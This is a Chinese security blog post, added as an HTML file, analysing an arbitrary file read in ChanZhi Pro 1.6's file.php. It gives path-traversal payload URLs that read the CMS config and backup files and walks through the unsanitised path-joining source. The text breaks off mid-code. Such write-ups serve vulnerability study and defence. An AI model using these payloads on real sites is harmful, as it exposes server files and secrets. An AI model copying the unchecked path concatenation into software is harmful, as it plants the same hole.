@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="禅知Pro 1.6 前台任意文件读取分析 - F0rmat&#39;s Blog">
+    <meta property="og:title" content="禅知Pro 1.6 前台任意文件读取分析 - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="禅知Pro 1.6 前台任意文件读取分析 - F0rmat&#39;s Blog">
+    <meta name="description" content="0x01 前言 这两天看到禅知这个CMS有一个前台的任意文件读取漏洞，就在此写一片分析文章。 0x02 环境 下载安装安装程序，这个CMS是封装起来的，连着Apa">
+    <meta property="og:description" content="0x01 前言 这两天看到禅知这个CMS有一个前台的任意文件读取漏洞，就在此写一片分析文章。 0x02 环境 下载安装安装程序，这个CMS是封装起来的，连着Apa">
+    <meta property="twitter:description" content="0x01 前言 这两天看到禅知这个CMS有一个前台的任意文件读取漏洞，就在此写一片分析文章。 0x02 环境 下载安装安装程序，这个CMS是封装起来的，连着Apa">
+    <meta property="og:type" content="article">
+    <title>禅知Pro 1.6 前台任意文件读取分析 - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis.html" title="禅知Pro 1.6 前台任意文件读取分析">禅知Pro 1.6 前台任意文件读取分析</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2018-08-19 10:00:02 UTC">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 19 Aug 2018
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            1748 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            4 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-前言">0x01 前言</a></li>
+    <li><a href="#0x02-环境">0x02 环境</a></li>
+    <li><a href="#0x03-漏洞复现">0x03 漏洞复现</a></li>
+    <li><a href="#0x04-漏洞分析">0x04 漏洞分析</a></li>
+    <li><a href="#0x05-参考">0x05 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x01-前言">0x01 前言</h1>
+<p>这两天看到禅知这个CMS有一个<code>前台</code>的任意文件读取漏洞，就在此写一片分析文章。</p>
+<h1 id="0x02-环境">0x02 环境</h1>
+<ol>
+<li>下载安装安装程序，这个CMS是封装起来的，连着Apache+MySQL一起打包成exe可执行程序。</li>
+<li>安装也比较简单，傻瓜式安装。</li>
+</ol>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/chanzhi/1.png" alt=""></p>
+<!-- raw HTML omitted -->
+<h1 id="0x03-漏洞复现">0x03 漏洞复现</h1>
+<ol>
+<li>在网站根目录<code>C:\xampp\chanzhi\www</code>新建一个测试文件<code>test.php</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/chanzhi/2.png" alt=""></li>
+<li>执行payload查看文件内容：<code>http://localhost/file.php?pathname=../test.phpi&amp;t=txt&amp;o=source</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/chanzhi/4.png" alt=""></li>
+<li>执行payload来查看程序的配置文件：<code>http://localhost/file.php?pathname=../http.ini&amp;t=txt&amp;o=source</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/chanzhi/2-1.png" alt=""></li>
+<li>跨目录读取文件（前提是有目录权限）：<code>http://localhost/file.php?pathname=../../bin/php/backup.php&amp;t=txt&amp;o=source</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/chanzhi/3.png" alt=""></li>
+</ol>
+<h1 id="0x04-漏洞分析">0x04 漏洞分析</h1>
+<p><strong>漏洞文件：<code>C:\xampp\chanzhi\www\file.php</code>,从头开始往下分析：</strong></p>
+<ol>
+<li>1-19行是定义变量和判断是否GET传值过来，传全称或者简称都可以赋值给对应的变量，比如:<code>http://192.168.86.130/file.php?f=../test.php&amp;t=txt&amp;o=source</code>,<code>pathname</code>和<code>f</code>是对应的，下面的以此类推。
+主要是19行，<code>$_SERVER['SCRIPT_FILENAME']</code>的值是<code>C:/xampp/chanzhi/www/file.php</code>,加上<code>dirname</code>函数后的值为<code>C:/xampp/chanzhi/www</code>。
+<code>rtrim</code>函数是去掉<code>/</code>右边的值然后加上<code>/data</code>/之后<code>$dataRoot</code>的值为<code>C:/xampp/chanzhi/www/data/</code></li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pathname</span>   <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$objectType</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$imageSize</span>  <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$extension</span>  <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$version</span>    <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pathname&#39;</span><span class="p">]))</span>   <span class="nv">$pathname</span>   <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pathname&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;objectType&#39;</span><span class="p">]))</span> <span class="nv">$objectType</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;objectType&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;imageSize&#39;</span><span class="p">]))</span>  <span class="nv">$imageSize</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;imageSize&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">]))</span>  <span class="nv">$extension</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span> <span class="nv">$pathname</span>   <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;o&#39;</span><span class="p">]))</span> <span class="nv">$objectType</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;o&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;s&#39;</span><span class="p">]))</span> <span class="nv">$imageSize</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;s&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">]))</span> <span class="nv">$extension</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v&#39;</span><span class="p">]))</span> <span class="nv">$version</span>    <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$dataRoot</span> <span class="o">=</span> <span class="nx">rtrim</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_FILENAME&#39;</span><span class="p">]),</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/data/&#39;</span><span class="p">;</span>
+</span></span></code></pre></div><ol start="2">
+<li>判断<code>$objectType</code>变量的值，如果传入的值不是<code>source</code>和<code>slide</code>，那么进入<code>else</code>的代码段，但是会加上<code>upload</code>目录就不能实现任意文件读取了，所以传入<code>source</code>是最合适的。
+<code>$dataRoot</code>赋值给<code>$savePath</code>然后和<code>$pathname</code>拼接起来赋值给<code>$realPath</code>变量</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$objectType</span> <span class="o">==</span> <span class="s1">&#39;source&#39;</span> <span class="k">or</span> <span class="nv">$objectType</span> <span class="o">==</span> <span class="s1">&#39;slide&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$objectType</span> <span class="o">==</span> <span class="s1">&#39;slide&#39;</span> <span class="k">and</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^slides\/[0-9_0-9]/&#39;</span><span class="p">,</span> <span class="nv">$pathname</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;The file does not exist!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$savePath</span> <span class="o">=</span> <span class="nv">$dataRoot</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[0-9]{6}\/f_[a-z0-9]{32}/&#39;</span><span class="p">,</span> <span class="nv">$pathname</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;The file does not exist!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$savePath</span> <span class="o">=</span> <span class="nv">$dataRoot</span> <span class="o">.</span> <span class="s1">&#39;upload/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$realPath</span> <span class="o">=</span> <span class="nv">$savePath</span> <span class="o">.</span> <span class="nv">$pathname</span><span class="p">;</span>
+</span></span></code></pre></div><ol start="3">
+<li>开头判断<code>$realPath</code>文件是否存在，接下来把<code>$realPath</code>赋值给<code>$filePath</code>，<code>$mime = getMimetype($extension);</code>这一句是根据参数<code>t</code>或者<code>extension</code>传过来的值决定<code>Content-Type</code>的可用值。
+<code>getMimetype</code>函数可以到123行查看，比如我们传过来的值<code>$_GET['t']=txt</code>,那么就会对应的<code>Content-Type</code>是：
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/chanzhi/5.png" alt=""></li>
+</ol>
+<p><code>header(&quot;Content-type: $mime&quot;);</code>是定义HTTP头<code>Content-type</code>内容，<code>$handle = fopen($filePath, &quot;r&quot;);</code>读取<code>$filePath</code>的文件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$realPath</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$realPath</span> <span class="o">=</span> <span class="nv">$savePath</span> <span class="o">.</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$pathname</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">?</span> <span class="nv">$pathname</span> <span class="o">:</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$pathname</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$pathname</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filePath</span> <span class="o">=</span> <span class="nv">$realPath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$imageSize</span> <span class="o">==</span> <span class="s1">&#39;smallURL&#39;</span><span class="p">)</span>  <span class="nv">$filePath</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;f_&#39;</span><span class="p">,</span> <span class="s1">&#39;s_&#39;</span><span class="p">,</span> <span class="nv">$realPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$imageSize</span> <span class="o">==</span> <span class="s1">&#39;middleURL&#39;</span><span class="p">)</span> <span class="nv">$filePath</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;f_&#39;</span><span class="p">,</span> <span class="s1">&#39;m_&#39;</span><span class="p">,</span> <span class="nv">$realPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$imageSize</span> <span class="o">==</span> <span class="s1">&#39;largeURL&#39;</span><span class="p">)</span>  <span class="nv">$filePath</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;f_&#39;</span><span class="p">,</span> <span class="s1">&#39;l_&#39;</span><span class="p">,</span> <span class="nv">$realPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">))</span> <span class="nv">$filePath</span> <span class="o">=</span> <span class="nv">$realPath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;The file does not exist!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$seconds</span> <span class="o">=</span> <span class="mi">3600</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">30</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$expires</span> <span class="o">=</span> <span class="nx">gmdate</span><span class="p">(</span><span class="s2">&#34;D, d M Y H:i:s&#34;</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="nv">$seconds</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; GMT&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Expires: </span><span class="si">$expires</span><span class="s2">&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Pragma: cache&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Cache-Control: max-age=</span><span class="si">$seconds</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$mime</span> <span class="o">=</span> <span class="nx">getMimetype</span><span class="p">(</span><span class="nv">$extension</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-type: </span><span class="si">$mime</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$handle</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><ol start="4">
+<li>还没结束，触发是靠<code>while(!feof($handle)) echo fgets($handle);</code>这一句，如果没有这一句就不会构成任意文件读取，所以每一步都很关键。</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$mime</span> <span class="o">==</span> <span class="s1">&#39;video/mp4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$length</span> <span class="o">=</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$start</span>  <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$end</span>    <span class="o">=</span> <span class="nv">$length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Accept-Ranges: 0-</span><span class="si">$length</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_RANGE&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$cStart</span> <span class="o">=</span> <span class="nv">$start</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$cEnd</span>   <span class="o">=</span> <span class="nv">$end</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">list</span><span class="p">(,</span> <span class="nv">$range</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_RANGE&#39;</span><span class="p">],</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$range</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.1 416 Requested Range Not Satisfiable&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Range: bytes </span><span class="si">$start</span><span class="s2">-</span><span class="si">$end</span><span class="s2">/</span><span class="si">$length</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$range</span> <span class="o">==</span> <span class="s1">&#39;-&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$cStart</span> <span class="o">=</span> <span class="nv">$length</span> <span class="o">-</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$range</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$range</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="nv">$range</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$cStart</span> <span class="o">=</span> <span class="nv">$range</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$cEnd</span>   <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$range</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$range</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="o">?</span> <span class="nv">$range</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nv">$cEnd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$cEnd</span> <span class="o">&gt;</span> <span class="nv">$end</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$end</span> <span class="o">:</span> <span class="nv">$cEnd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$cStart</span> <span class="o">&gt;</span> <span class="nv">$cEnd</span> <span class="o">||</span> <span class="nv">$cStart</span> <span class="o">&gt;</span> <span class="nv">$length</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">||</span> <span class="nv">$cEnd</span> <span class="o">&gt;=</span> <span class="nv">$length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.1 416 Requested Range Not Satisfiable&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Range: bytes </span><span class="si">$start</span><span class="s2">-</span><span class="si">$end</span><span class="s2">/</span><span class="si">$length</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nv">$start</span>  <span class="o">=</span> <span class="nv">$cStart</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$end</span>    <span class="o">=</span> <span class="nv">$cEnd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$length</span> <span class="o">=</span> <span class="nv">$end</span> <span class="o">-</span> <span class="nv">$start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">fseek</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nv">$start</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.1 206 Partial Content&#39;</span><span class="p">);</span>
